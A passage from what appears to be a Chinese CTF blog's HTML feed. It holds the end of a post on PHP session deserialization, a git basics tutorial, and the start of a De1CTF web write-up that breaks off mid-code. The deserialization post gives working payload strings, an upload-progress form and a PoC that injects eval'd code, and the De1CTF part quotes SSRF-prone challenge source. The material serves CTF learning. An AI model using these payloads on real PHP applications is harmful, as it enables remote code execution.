alt=""></p><p><strong>PS：chr(4)是不可见字符</strong></p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'sketch_pl4ne'</span>] = $_GET[<span class="string">'a'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = <span class="string">'SP_wants_a_girlfriend.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hi! '</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = <span class="string">'SP_wants_a_girlfriend.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hi! '</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> sketch_pl4ne();</span><br><span class="line">$o-&gt;name = <span class="string">'sketch_pl4ne'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：<code>/foo1.php?a=|O:12:&quot;sketch_pl4ne&quot;:1:{s:4:&quot;name&quot;;s:12:&quot;sketch_pl4ne&quot;;}</code></p><p>访问<code>foo2.php</code>，成功输出<code>hi! sketch_pl4ne</code>。</p><p>查看生成的session文件：</p><p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5GHt.png" alt=""></p><p>可以发现只要我们在需要传入的序列化字符串前加<code>|</code>，那么走<code>foo2.php</code>的<code>php</code>处理器时前面都会被当作session_name，后面构造的序列化字符串自然就被解析了。</p><h3 id="php-session-uoload-progress"><a href="#php-session-uoload-progress" class="headerlink" title="php_session_uoload_progress"></a>php_session_uoload_progress</h3><p>当没有$_SESSION[‘sketch_pl4ne’] = $_GET[‘a’]这么好的条件时该怎么写入payload呢？我们还可以利用php的上传进度报告向session文件中写入构造好的payload (doge)</p><p>这里以jarvisoj中的PHPINFO为例：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">PHPINFO</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现是个很简单的反序列化，关键是找不到输入点，这里需要利用另外一种触发session反序列化的方式：<strong><em>利用上传进度报告向SESSION文件中写入payload。</em></strong></p><p>我们可以设置一个与session.upload_progress.name同名的变量(默认为PHP_SESSION_UPLOAD_PROGRESS)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据。我们就可以控制这个数据内容为我们的恶意payload。</p><p>触发条件：</p><ul><li>session.upload_progress.enabled=On</li><li>session.upload_progress.cleanup=Off</li></ul><p>通过phpinfo()页面可以发现符合条件</p><p>首先构造一个upload.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt; </span><br><span class="line">    &lt;!--value为payload输入点--&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>再根据题目写一个PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line">$a-&gt;mdzz = <span class="string">"print_r(scandir('.'));"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PS：注意在生成的payload前加<code>|</code>。</p><p>最后flag在一个很诡异的地方= =</p><p><img src="https://t1.picb.cc/uploads/2019/10/07/gL58CJ.png" alt=" "></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天得知英语作文超级加倍，唉，我反手点一个不写，闷声发大财~</p><p>明天sql注入总结，冲冲冲！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在先知看到&lt;strong&gt;Threezh1&lt;/strong&gt;师傅的&lt;a href=&quot;https://xz.aliyun.com/t/6454
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>git学习</title>
    <link href="https://www.sketchplane.top/2019/09/28/git%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.sketchplane.top/2019/09/28/git%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-09-28T01:17:31.000Z</published>
    <updated>2019-09-28T02:33:50.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Git是一个优秀的分布式版本控制系统，使用起来确实比较方便。</p><p>趁着周末花了两个小时学习了一下基础命令，以目前我的理解来说，它主要是方便我们保存进度，类似于存档机制，理解有误不接受反驳（哼 。</p><h2 id="本地仓库"><a href="#本地仓库" class="headerlink" title="本地仓库"></a>本地仓库</h2><h3 id="初始化仓库"><a href="#初始化仓库" class="headerlink" title="初始化仓库"></a>初始化仓库</h3><p>首先我们可以在本地新建一个目录，然后运行初始化命令让它成为一个<code>repository</code>，因为这样我们才能使用git命令进行添加和提交等操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br></pre></td></tr></table></figure><h3 id="添加文件"><a href="#添加文件" class="headerlink" title="添加文件"></a>添加文件</h3><p>我们通常先将编写好的代码文件储存在到本地仓库，最后push到远程仓库中(github)，在本地添加文件到仓库需要两个步骤：<code>添加</code>和<code>提交</code>。</p><p>添加类似于先把文件放在缓冲区中，<strong>可以连续添加多个文件，最后一并提交：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add &lt;file_1&gt; &lt;file_2&gt; ... &lt;file_n&gt;</span></span><br></pre></td></tr></table></figure><p>然后提交，这里的 -m 参数是写一段描述信息，方便以后查阅：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit &lt;file&gt; -m <span class="string">"your description"</span></span></span><br></pre></td></tr></table></figure><p>这样我们就把文件添加到本地仓库了~</p><h3 id="推送至远程仓库"><a href="#推送至远程仓库" class="headerlink" title="推送至远程仓库"></a>推送至远程仓库</h3><p>接下来把本地仓库push到代码托管平台：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin git@github.com:sketchpl4ne/learngit.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br></pre></td></tr></table></figure><p>这样我们就把本地仓库的内容推送到<code>github</code>上了~</p><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p>我们使用得最多的应该就是把github上的项目克隆到本地，比如将我最近fork的一个<code>程序猿养成计划</code>的项目clone到本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git@github.com:sketchpl4ne/growing-up.git</span></span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/09/28/gT6HJD.png" alt=""></p><p>当然这里也支持http://协议，不过默认的git://使用ssh速度应该是更快的。</p><h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><h3 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br></pre></td></tr></table></figure><h3 id="当前状态"><a href="#当前状态" class="headerlink" title="当前状态"></a>当前状态</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br></pre></td></tr></table></figure><h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^^^ //回退到上三个版本</span></span><br></pre></td></tr></table></figure><p>由于cmd下 <code>^</code>默认换行符，需要用双引号包裹：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard <span class="string">"HEAD^^^"</span><span class="string">" //回退到上三个版本，cmd版</span></span></span><br></pre></td></tr></table></figure><h3 id="删除文件与撤销删除"><a href="#删除文件与撤销删除" class="headerlink" title="删除文件与撤销删除"></a>删除文件与撤销删除</h3><p>如果在当前目录删除了文件，需要在git下同步删除，使用 <code>git status</code>会有提示，如果真的要删除的话，与添加文件类似，先删除，再提交：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git rm whz_tianxiadiyi.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"remove whz_tianxiadiyi.txt"</span></span></span><br></pre></td></tr></table></figure><p>如果是误删的话，一条命令即可恢复：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- whz_tianxiadiyi.txt</span></span><br></pre></td></tr></table></figure><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><p>创建分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch dev</span></span><br></pre></td></tr></table></figure><p>切换分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev  //注意与恢复删除区分</span></span><br></pre></td></tr></table></figure><p>查看当前分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br></pre></td></tr></table></figure><p><strong><em>然后在分支下进行一系列操作（添加文件之类）</em></strong></p><p>合并分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout master</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br></pre></td></tr></table></figure><p>删除分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>说来惭愧，注册GitHub账号快一年了，除非需要下载一些工具几乎不怎么看github；一是访问速度慢+全英感觉不是很友好，二是就个人来说对大多数人推荐的东西不是很想了解（github，docker，bootstrap 等等…）</p><p>不过最近有在慢慢改变，感觉之前太浮躁了，为了进线下/拿奖而CTF，没进就开始自闭。线下需要进，但也别忘了打CTF的乐趣吧~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Git是一个优秀的分布式版本控制系统，使用起来确实比较方便。&lt;/p&gt;
&lt;p&gt;趁着周末花了两个小时学习了一下基础命令，以目前我的理解来说，它主
      
    
    </summary>
    
    
    
      <category term="Basic" scheme="https://www.sketchplane.top/tags/Basic/"/>
    
  </entry>
  
  <entry>
    <title>De1ctf Web复现</title>
    <link href="https://www.sketchplane.top/2019/09/25/De1ctf-Web%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.sketchplane.top/2019/09/25/De1ctf-Web%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-09-25T15:26:12.000Z</published>
    <updated>2019-09-26T05:48:59.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近深感自己语言基础差，得恶补一下了= =</p><h2 id="SSRFMe"><a href="#SSRFMe" class="headerlink" title="SSRFMe"></a>SSRFMe</h2><p><strong>考察点：Hash长度拓展攻击</strong></p><p>这题我了解到有三种解法，其中一个字符串拼接还挺有意思的，不过听说师傅投先知没有被收，估计应该在博客里，有兴趣可以去学习一波。</p><p>直接给了代码，我们审计一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)  <span class="comment"># 生成一个长度为16的随机字符串</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 传入ip，md5后返回沙盒文件名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># param禁用gopher和file协议</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span 